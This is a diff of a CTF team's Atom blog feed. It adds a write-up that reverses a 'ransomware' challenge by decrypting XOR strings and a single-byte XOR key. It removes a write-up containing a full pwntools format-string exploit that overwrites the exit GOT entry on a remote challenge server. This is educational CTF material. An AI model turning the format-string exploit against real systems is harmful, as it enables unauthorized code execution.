@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://teamrocketist.github.io/"/>
-  <updated>2017-12-18T04:19:37.571Z</updated>
+  <updated>2017-12-18T19:51:59.739Z</updated>
   <id>https://teamrocketist.github.io/</id>
   
   <author>
@@ -14,6 +14,65 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>[Reverse] 3DS - Ransomware</title>
+    <link href="https://teamrocketist.github.io/2017/12/18/Reverse-3DS-Ransomware/"/>
+    <id>https://teamrocketist.github.io/2017/12/18/Reverse-3DS-Ransomware/</id>
+    <published>2017-12-18T19:45:33.000Z</published>
+    <updated>2017-12-18T19:51:59.739Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><br>Ransomware - 464 Points<br>WARNING! DON’T EXECUTE THIS SAMPLE IN YOUR OWN PERSONAL MACHINE!!!<br></blockquote>
+
+<p>We have a malware to analyse, right at the beginning(_start function) I found an encrypted string with xor, reversing it wasn’t very hard as you can see bellow:<br><a data-fancybox="gallery" href="https://i.imgur.com/TN8MrPg.png" target="_blank" rel="external"></a></p>
+<p><img src="https://i.imgur.com/TN8MrPg.png" alt=""><br><br>The actual function in the ida was this one:<br><a data-fancybox="gallery" href="https://i.imgur.com/RTpcq1L.png" target="_blank" rel="external"></a></p>
+<p><img src="https://i.imgur.com/RTpcq1L.png" alt=""><br><br>Rewriting this function into python we ended up with this:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> struct</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub_4005D0</span><span class="params">(al, ecx, edx)</span>:</span></div><div class="line">	c = <span class="string">''</span></div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(ecx):</div><div class="line">		c += chr(ord(edx[i]) ^ ord(al))</div><div class="line">	<span class="keyword">return</span> c</div><div class="line"></div><div class="line">first = struct.pack (<span class="string">"16B"</span>, *[</div><div class="line"><span class="number">0xea</span>,<span class="number">0xe8</span>,<span class="number">0xe4</span>,<span class="number">0xe8</span>,<span class="number">0xef</span>,<span class="number">0xdb</span>,<span class="number">0xe1</span>,<span class="number">0xeb</span>,<span class="number">0xe6</span>,<span class="number">0xe0</span>,<span class="number">0xa9</span>,</div><div class="line"><span class="number">0xea</span>,<span class="number">0xe8</span>,<span class="number">0xe4</span>,<span class="number">0xe8</span>,<span class="number">0xef</span>])</div><div class="line"><span class="keyword">print</span> sub_4005D0(al=<span class="string">'\x87'</span>,ecx=<span class="number">0x11</span><span class="number">-1</span>, edx=first)</div></pre></td></tr></table></figure>
+<p>By running the script we can see that the encrypted string was the name of the file we received from the challenge which was encrypted:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ python writeup_mocoh.py </div><div class="line">mocoh\flag.moco</div></pre></td></tr></table></figure>
+<p>One good thing to do while reversing is to rename the function and string names to a more readable names, so if they are reused we can immediately recognize them :<br><a data-fancybox="gallery" href="https://i.imgur.com/AAnYTBF.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/AAnYTBF.png" alt=""><br></a></p>
+<p>Now continuing analysing the contents of <code>sub_40023B</code> we have more strings to decrypt:</p>
+<p><a data-fancybox="gallery" href="https://i.imgur.com/qjZakVp.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/qjZakVp.png" alt=""><br></a></p>
+<p>Updating this python script with this:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> struct</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub_4005D0</span><span class="params">(al, ecx, edx)</span>:</span></div><div class="line">	c = <span class="string">''</span></div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(ecx):</div><div class="line">		c += chr(ord(edx[i]) ^ ord(al))</div><div class="line">	<span class="keyword">return</span> c</div><div class="line"></div><div class="line">first = struct.pack (<span class="string">"16B"</span>, *[</div><div class="line"><span class="number">0xea</span>,<span class="number">0xe8</span>,<span class="number">0xe4</span>,<span class="number">0xe8</span>,<span class="number">0xef</span>,<span class="number">0xdb</span>,<span class="number">0xe1</span>,<span class="number">0xeb</span>,<span class="number">0xe6</span>,<span class="number">0xe0</span>,<span class="number">0xa9</span>,</div><div class="line"><span class="number">0xea</span>,<span class="number">0xe8</span>,<span class="number">0xe4</span>,<span class="number">0xe8</span>,<span class="number">0xef</span>])</div><div class="line"><span class="keyword">print</span> sub_4005D0(al=<span class="string">'\x87'</span>,ecx=<span class="number">0x11</span><span class="number">-1</span>, edx=first)</div><div class="line">a = sub_4005D0(al=<span class="string">'\x54'</span>,ecx=<span class="number">9</span><span class="number">-1</span>, edx=struct.pack (<span class="string">"8B"</span>, *[</div><div class="line"><span class="number">0x27</span>,<span class="number">0x31</span>,<span class="number">0x21</span>,<span class="number">0x26</span>,<span class="number">0x21</span>,<span class="number">0x36</span>,<span class="number">0x21</span>,<span class="number">0x37</span>]))</div><div class="line">b = sub_4005D0(al=<span class="string">'\x80'</span>,ecx=<span class="number">9</span><span class="number">-1</span>, edx=struct.pack (<span class="string">"8B"</span>, *[</div><div class="line"><span class="number">0xe1</span>,<span class="number">0xee</span>,<span class="number">0xf4</span>,<span class="number">0xe1</span>,<span class="number">0xf3</span>,<span class="number">0xf3</span>,<span class="number">0xe5</span>,<span class="number">0xe5</span>]))</div><div class="line">c = sub_4005D0(al=<span class="string">'\x14'</span>,ecx=<span class="number">9</span><span class="number">-1</span>, edx=struct.pack (<span class="string">"8B"</span>, *[</div><div class="line"><span class="number">0x61</span>,<span class="number">0x77</span>,<span class="number">0x7b</span>,<span class="number">0x78</span>,<span class="number">0x7b</span>,<span class="number">0x77</span>,<span class="number">0x75</span>,<span class="number">0x62</span>]))</div><div class="line">d = sub_4005D0(al=<span class="string">'\x32'</span>,ecx=<span class="number">0xa</span><span class="number">-1</span>, edx=struct.pack (<span class="string">"9B"</span>, *[</div><div class="line"><span class="number">0x53</span>,<span class="number">0x5c</span>,<span class="number">0x53</span>,<span class="number">0x55</span>,<span class="number">0x53</span>,<span class="number">0x5b</span>,<span class="number">0x5d</span>,<span class="number">0x5e</span>,<span class="number">0x53</span>]))</div><div class="line"></div><div class="line"><span class="keyword">print</span> a</div><div class="line"><span class="keyword">print</span> b</div><div class="line"><span class="keyword">print</span> c</div><div class="line"><span class="keyword">print</span> d</div></pre></td></tr></table></figure>
+<p>By running we can see it’s some words in Portuguese and they don’t look really useful at all:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ python mocoh.py</div><div class="line">mocoh\flag.mocoh</div><div class="line">mocoh\flag.mocoh</div><div class="line">seurubuc</div><div class="line">antassee</div><div class="line">ucolocav</div><div class="line">anagaiola</div></pre></td></tr></table></figure>
+<p>After renaming the variable names in IDA ended up in this final part of the program:</p>
+<p><a data-fancybox="gallery" href="https://i.imgur.com/LdcEHnx.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/LdcEHnx.png" alt=""><br></a></p>
+<p>As you can see above every string we decrypted is being concatenated into a place in memory at <strong>dword_4012c0</strong>, and at the end in <strong>sub_4005DA</strong> the flag file name is being pushed in to the stack since this will be a argument to that function so this may be the one that was used to encrypted the <em>flag.mocoh</em> file!</p>
+<p><a data-fancybox="gallery" href="https://i.imgur.com/TCnKYK2.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/TCnKYK2.png" alt=""><br></a></p>
+<p>Now by checking this function I found it too hard to reverse <strong>sub_400684</strong>, without running the malware itself (Couldn’t do it since it executable wasn’t compatible with my Windows 10 VM), so after failing to infect myself and debugging it with IDA, I checked that <strong>sub_4006D8</strong> of them was using xor again to encrypt that file:</p>
+<p><a data-fancybox="gallery" href="https://i.imgur.com/DZrDX8X.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/DZrDX8X.png" alt=""><br></a></p>
+<p>Now you may be asking if I didn’t reverse <strong>sub_400684</strong> how the hell I did get the keys to decrypt the flag file? well I wasn’t really expecting this to happen but at some point I knew I could know the first 4 bytes of the key because we know the first 4 bytes of the plaintext which is part of the flag format <strong>3DS{</strong>, I wanted to check before reversing the rest, the first 4 bytes of the key, I did this by brute-forcing byte by byte:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">flag_cipher = open(<span class="string">'flag.mocoh'</span>, <span class="string">'r'</span>).read()</div><div class="line">plain = <span class="string">'3DS&#123;'</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x4</span>):</div><div class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">0xff</span>):</div><div class="line">        <span class="keyword">if</span> ord(plain[i]) == ord(flag_cipher[i]) ^ x:</div><div class="line">            <span class="keyword">print</span> x</div><div class="line">            <span class="keyword">break</span></div></pre></td></tr></table></figure>
+<p>And the surprisingly to me the first 4 bytes of the keys was always <strong>175</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ python test.py </div><div class="line">175</div><div class="line">175</div><div class="line">175</div><div class="line">175</div></pre></td></tr></table></figure>
+<p>And then I asked myself what if the key is always the same? this couldn’t be a coincidence:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">flag_cipher = open(<span class="string">'flag.mocoh'</span>, <span class="string">'r'</span>).read()</div><div class="line">flag = <span class="string">''</span></div><div class="line"><span class="keyword">for</span> i,c <span class="keyword">in</span> enumerate(flag_cipher):</div><div class="line">    flag += chr(ord(c) ^ <span class="number">175</span>)</div><div class="line"><span class="keyword">print</span> flag</div></pre></td></tr></table></figure>
+<p>Running it we could see that this was the case…<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ python test.py </div><div class="line">3DS&#123;4sS3mbly_r0cks!!&#125;</div></pre></td></tr></table></figure></p>
+<p>And in the end I realized that lost a lot of time reversing the binary, we didn’t even needed to reverse anything, if we made a guess that it was xor we could just tried and check that it was using always the same 1 byte key to encrypt…</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;blockquote&gt;&lt;br&gt;Ransomware - 464 Points&lt;br&gt;WARNING! DON’T EXECUTE THIS SAMPLE IN YOUR OWN PERSONAL MACHINE!!!&lt;br&gt;&lt;/blockquote&gt;
+
+&lt;p&gt;We have a
+    
+    </summary>
+    
+    
+      <category term="xor" scheme="https://teamrocketist.github.io/tags/xor/"/>
+    
+      <category term="3DS2017" scheme="https://teamrocketist.github.io/tags/3DS2017/"/>
+    
+      <category term="malware" scheme="https://teamrocketist.github.io/tags/malware/"/>
+    
+      <category term="ida" scheme="https://teamrocketist.github.io/tags/ida/"/>
+    
+      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
+    
+  </entry>
   
   <entry>
     <title>[Reverse] 3DS - Scared Flag</title>
@@ -118,9 +177,9 @@
     
       <category term="rop" scheme="https://teamrocketist.github.io/tags/rop/"/>
     
-      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
-    
       <category term="stack_overflow" scheme="https://teamrocketist.github.io/tags/stack-overflow/"/>
+    
+      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
     
       <category term="go" scheme="https://teamrocketist.github.io/tags/go/"/>
     
@@ -248,9 +307,9 @@
     
       <category term="web" scheme="https://teamrocketist.github.io/tags/web/"/>
     
-      <category term="sqli" scheme="https://teamrocketist.github.io/tags/sqli/"/>
-    
       <category term="tpctf2017" scheme="https://teamrocketist.github.io/tags/tpctf2017/"/>
+    
+      <category term="sqli" scheme="https://teamrocketist.github.io/tags/sqli/"/>
     
       <category term="blindSqli" scheme="https://teamrocketist.github.io/tags/blindSqli/"/>
     
@@ -284,13 +343,13 @@
     
       <category term="web" scheme="https://teamrocketist.github.io/tags/web/"/>
     
+      <category term="tpctf2017" scheme="https://teamrocketist.github.io/tags/tpctf2017/"/>
+    
       <category term="xss" scheme="https://teamrocketist.github.io/tags/xss/"/>
     
       <category term="passwordreset" scheme="https://teamrocketist.github.io/tags/passwordreset/"/>
     
       <category term="jquery" scheme="https://teamrocketist.github.io/tags/jquery/"/>
-    
-      <category term="tpctf2017" scheme="https://teamrocketist.github.io/tags/tpctf2017/"/>
     
   </entry>
   
@@ -358,9 +417,9 @@
     
       <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
     
-      <category term="r2script" scheme="https://teamrocketist.github.io/tags/r2script/"/>
-    
       <category term="bytebybyte" scheme="https://teamrocketist.github.io/tags/bytebybyte/"/>
+    
+      <category term="r2script" scheme="https://teamrocketist.github.io/tags/r2script/"/>
     
       <category term="tuctf2017" scheme="https://teamrocketist.github.io/tags/tuctf2017/"/>
     
@@ -540,9 +599,9 @@ array_upper(xpath (<span class="string">'row'</span>, query_to_xml (<span class=
     
       <category term="rop" scheme="https://teamrocketist.github.io/tags/rop/"/>
     
-      <category term="ret2libc" scheme="https://teamrocketist.github.io/tags/ret2libc/"/>
-    
       <category term="stack_overflow" scheme="https://teamrocketist.github.io/tags/stack-overflow/"/>
+    
+      <category term="ret2libc" scheme="https://teamrocketist.github.io/tags/ret2libc/"/>
     
   </entry>
   
@@ -955,56 +1014,6 @@ d = []
       <category term="backdoorctf" scheme="https://teamrocketist.github.io/tags/backdoorctf/"/>
     
       <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>[Pwn] BackdoorCTF 2017 - baby0x41414141</title>
-    <link href="https://teamrocketist.github.io/2017/09/25/Pwn-BackdoorCTF-2017-baby0x41414141/"/>
-    <id>https://teamrocketist.github.io/2017/09/25/Pwn-BackdoorCTF-2017-baby0x41414141/</id>
-    <published>2017-09-25T04:46:07.000Z</published>
-    <updated>2017-10-05T02:52:19.667Z</updated>
-    
-    <content type="html"><![CDATA[<p><a data-fancybox="gallery" href="https://i.imgur.com/pX6qbFQ.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/pX6qbFQ.png" alt=""><br></a><br><em>1.1 - format string vulnerability.</em></p>
-<p>We have a format string vulnerability we can confirm this by running the binary:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ ./32_new </div><div class="line">Hello baby pwner, whats your name?</div><div class="line">%x</div><div class="line">Ok cool, soon we will know whether you pwned it or not. Till <span class="keyword">then</span> Bye 8048914</div></pre></td></tr></table></figure>
-<p>A there it is, we leaked an address from the stack, analysing the binary again we can see we already have a cool function that calls <code>system(&#39;cat flag.txt&#39;)</code> so we don’t have to actually leak libc addresses and go through all that trouble:<br><a data-fancybox="gallery" href="https://i.imgur.com/TIY3ZzO.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/TIY3ZzO.png" alt=""><br></a><br><em>1.2 - flag function.</em></p>
-<p>This one is really simple:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1 - Calculate the offset of the address we put in the stack using %p.</div><div class="line">2 - Modify the exit function address with flag function using %n.</div></pre></td></tr></table></figure>
-<p>Before going into an explanation I’ll show you some modifiers from <code>printf</code> man page this will be useful since we want to override a certain number of bytes and this length modifiers will help us on that.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">An optional length modifier, that specifies the size of the argument.</div><div class="line">         The following length modifiers are valid for the d, i, n, o, u, x, or</div><div class="line">         X conversion:</div><div class="line"></div><div class="line">         Modifier          d, i           o, u, x, X            n</div><div class="line">         hh                signed char    unsigned char         signed char *</div><div class="line">         h                 short          unsigned short        short *</div><div class="line">         l (ell)           long           unsigned long         long *</div><div class="line">         ll (ell ell)      long long      unsigned long long    long long *</div><div class="line">         j                 intmax_t       uintmax_t             intmax_t *</div><div class="line">         t                 ptrdiff_t      (see note)            ptrdiff_t *</div><div class="line">         z                 (see note)     size_t                (see note)</div><div class="line">         q (deprecated)    quad_t         u_quad_t              quad_t *</div></pre></td></tr></table></figure>
-<p>For example if we want to override an address like this <code>0x0804870b</code> this a 32 bit address so if we need to change all the bits we would use <code>%ln</code> which is a long and it’s 32 bits or we could even use <code>%lln</code> would work too since is 64 bit (long long). </p>
-<p>Usually we want to use <code>%hn</code> so we can override 2 bytes(16 bits) at each if we get greedy and try to override it as long when the binary prints the string output it will take a lot of time since it needs <code>0x0804870b</code> spaces to be printed, this is why we prefer to use %hn the address but this time we need to do it in two operations instead of one.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">0804 -&gt; <span class="string">'%11hn'</span></div><div class="line">870b -&gt; <span class="string">'%10hn'</span></div></pre></td></tr></table></figure>
-<h3 id="Stack-address-offset-calculation"><a href="#Stack-address-offset-calculation" class="headerlink" title="Stack address offset calculation"></a>Stack address offset calculation</h3><p>We can do this by printing a bunch of addresses from the stack using <code>%x</code> or <code>%p</code>, we can insert some ‘AAAA’ in the beginning and the a bunch of <code>%x</code> and check on which location the ‘AAAA’ are positioned in the stack.</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">return</span> process(<span class="string">'./32_new'</span>) <span class="keyword">if</span> local <span class="keyword">else</span> remote(<span class="string">'163.172.176.29'</span>, <span class="number">9035</span>)</div><div class="line">r =getConn()</div><div class="line">r.recvuntil(<span class="string">'Hello baby pwner, whats your name?\n'</span>)</div><div class="line">s = <span class="string">'AAAA'</span>+ <span class="string">'%x,'</span>*<span class="number">20</span></div><div class="line">r.sendline(s)</div></pre></td></tr></table></figure>
-<p>We can see our <code>41414141</code> will appear in the position 10th, we now know where its located in the stack when we put some strings in the beginning: </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ python 32_new.py </div><div class="line">Ok cool, soon we will know whether you pwned it or not. Till then Bye AAAA8048914,ff92ee98,1,f745c618,36e,f7462668,ff92f144,ff92eee4,ff92eee0,41414141,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,</div></pre></td></tr></table></figure>
-<p>To access its position we can do like this:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">'%10$hn'</span></div></pre></td></tr></table></figure>
-<h3 id="Override-exit-function"><a href="#Override-exit-function" class="headerlink" title="Override exit function"></a>Override exit function</h3><p>Now we need to calculate how much characters we need to add into our format expression, for example if we needed 100 we could do it like this:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">'%100%10$hn'</span></div></pre></td></tr></table></figure>
-<p>Now starting the exploit we can easily get the exit <code>GOT</code> address with <code>pwntools</code> and the flag function we can get it from radare2 you can check it at the picture 1.2 above.</p>
-<p>One nice trick is to clear the existing <code>EXIT</code> function address with <code>%10$lln</code> of course since we are adding some characters at the begining of the string the address won’t be converted to 0 in this case it actually turned into <code>0x0000004e</code>, 0x4e is 78 in decimal and that’s why I’m subtracting in the 78! And there is another thing that is very cleaver, is to split the address in half using some bit operations with this we know exactly how many characters to add (of course you still need to do some debugging in <code>gdb</code>).</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">EXIT_GOT = binary.got[<span class="string">'exit'</span>]</div><div class="line"></div><div class="line">FLAG_LOW = FLAG &amp; <span class="number">0xffff</span></div><div class="line">FLAG_HIGH = (FLAG &amp; <span class="number">0xffff0000</span>) &gt;&gt; <span class="number">16</span></div><div class="line"></div><div class="line">s = p32(EXIT_GOT)</div><div class="line">s += p32(EXIT_GOT+<span class="number">2</span>)</div><div class="line">s += <span class="string">'%10$lln'</span> <span class="comment"># clears the already existing exit address</span></div><div class="line">s += <span class="string">'%&#123;&#125;x%11$hn'</span>.format(FLAG_HIGH<span class="number">-78</span>)</div><div class="line">s += <span class="string">'%&#123;&#125;x%10$hn'</span>.format(FLAG_LOW-FLAG_HIGH)</div></pre></td></tr></table></figure>
-<p>The full exploit:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">local = <span class="keyword">False</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">return</span> process(<span class="string">'./32_new'</span>) <span class="keyword">if</span> local <span class="keyword">else</span> remote(<span class="string">'163.172.176.29'</span>, <span class="number">9035</span>)</div><div class="line"></div><div class="line">r =getConn()</div><div class="line"><span class="comment">#gdb.attach(r, '''</span></div><div class="line"><span class="comment">#	b *0x08048724</span></div><div class="line"><span class="comment">#	c''')</span></div><div class="line">binary = ELF(<span class="string">'./32_new'</span>)</div><div class="line">FLAG = <span class="number">0x0804870b</span></div><div class="line">EXIT_GOT = binary.got[<span class="string">'exit'</span>]</div><div class="line"></div><div class="line">FLAG_LOW = FLAG &amp; <span class="number">0xffff</span></div><div class="line">FLAG_HIGH = (FLAG &amp; <span class="number">0xffff0000</span>) &gt;&gt; <span class="number">16</span></div><div class="line"></div><div class="line">s = p32(EXIT_GOT)</div><div class="line">s += p32(EXIT_GOT+<span class="number">2</span>)</div><div class="line">s += <span class="string">'%10$lln'</span> <span class="comment"># clears the already existing exit address</span></div><div class="line">s += <span class="string">'%&#123;&#125;x%11$hn'</span>.format(FLAG_HIGH<span class="number">-78</span>)</div><div class="line">s += <span class="string">'%&#123;&#125;x%10$hn'</span>.format(FLAG_LOW-FLAG_HIGH)</div><div class="line">r.recvuntil(<span class="string">'Hello baby pwner, whats your name?\n'</span>)</div><div class="line">r.sendline(s)</div><div class="line"><span class="keyword">print</span> r.recvall(timeout=<span class="number">1</span>)</div><div class="line">r.close()</div></pre></td></tr></table></figure>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;&lt;a data-fancybox=&quot;gallery&quot; href=&quot;https://i.imgur.com/pX6qbFQ.png&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;br&gt;&lt;img src=&quot;https://i.imgur.com/pX6qbF
-    
-    </summary>
-    
-      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
-    
-    
-      <category term="formatstring" scheme="https://teamrocketist.github.io/tags/formatstring/"/>
-    
-      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
-    
-      <category term="backdoorctf" scheme="https://teamrocketist.github.io/tags/backdoorctf/"/>
     
   </entry>
   
